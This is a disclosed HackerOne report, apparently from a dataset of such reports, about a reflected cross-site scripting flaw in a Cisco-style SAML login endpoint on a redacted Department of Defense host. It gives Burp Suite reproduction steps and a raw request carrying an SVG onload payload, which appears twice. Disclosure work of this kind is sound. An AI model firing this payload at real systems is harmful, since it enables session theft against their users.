---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1252282'
original_report_id: '1252282'
title: XSS on ███
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-07-06T09:32:36.562Z'
disclosed_at: '2021-08-19T19:07:19.999Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS on ███

## Metadata

- HackerOne Report ID: 1252282
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-08-19T19:07:19.999Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi , 
I found XSS on ██████████
IP Enumeration 
████

* go to https://███/+CSCOE+/logon.html?a0=15&a1=&a2=&a3=1
* intercept the request by burp suite and send it to repeater
* then edit the request to be like this
```
GET /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

SAMLResponse="><svg/onload=alert('0xElkot')>
```
███████

## Impact

Cookie Stealing - A malicious user can steal cookies and use them to gain access to the application.
Arbitrary requests - An attacker can use XSS to send requests that appear to be from the victim to the web server.
Malware download - XSS can prompt the user to download malware. Since the prompt looks like a legitimate request from the
site, the user may be more likely to trust the request and actually install the malware.
Defacement - attacker can deface the website usig javascript code.

Kind Regards,
@0xElkot

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
* go to https://█████████/+CSCOE+/logon.html?a0=15&a1=&a2=&a3=1
* intercept the request by burp suite and send it to repeater
* then edit the request to be like this
```
GET /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

SAMLResponse="><svg/onload=alert('0xElkot')>
```

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
